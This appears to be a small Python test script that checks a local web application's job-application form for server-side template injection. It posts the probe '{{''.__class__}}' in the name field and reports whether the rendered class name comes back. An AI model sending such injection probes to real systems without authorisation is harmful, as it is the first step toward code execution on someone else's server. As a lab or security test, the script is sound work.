import sys
import requests

sys.stdout.write("Starting test\n")
sys.stdout.flush()

s = requests.Session()
r1 = s.get("http://127.0.0.1:32856/application")

sys.stdout.write(f"GET: {r1.status_code}\n")
sys.stdout.flush()

r2 = s.post("http://127.0.0.1:32856/submit", data={
    "name": "{{''.__class__}}",
    "email": "t@t.com",
    "phone": "123",
    "experience": "5",
    "license": "X"
})

sys.stdout.write(f"POST: {r2.status_code}\n")
sys.stdout.flush()

has_class = ("<class" in r2.text)
sys.stdout.write(f"SSTI: {has_class}\n")
sys.stdout.flush()

